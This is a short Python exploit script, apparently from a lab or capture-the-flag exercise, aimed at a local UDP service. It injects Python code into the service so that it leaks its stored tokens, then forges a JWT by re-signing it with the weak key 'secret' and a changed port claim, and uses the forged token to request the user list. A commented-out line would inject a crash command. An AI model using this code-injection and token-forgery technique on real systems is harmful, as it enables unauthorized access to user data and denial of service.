import socket
from ast import literal_eval

import jwt

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('', 6666))

request = "sock.sendto(bytearray(str(TOKENS), 'utf-8'), ('', 6666))"
sock.sendto(bytearray(str(request), 'utf-8'), ('', 7777))
response = literal_eval(str(sock.recv(2048), 'utf-8'))
token = jwt.decode(response[0], 'secret', algorithm='HS256')
print(token)
token['port'] = 6666
print(token)

request = {
    'token': jwt.encode(token, 'secret', algorithm='HS256'),
    'action': 'get-users'
}
sock.sendto(bytearray(str(request), 'utf-8'), ('', 7777))
response = literal_eval(str(sock.recv(2048), 'utf-8'))
print(response)


# request = "exit(-1)"
# sock.sendto(bytearray(str(request), 'utf-8'), ('', 7777))
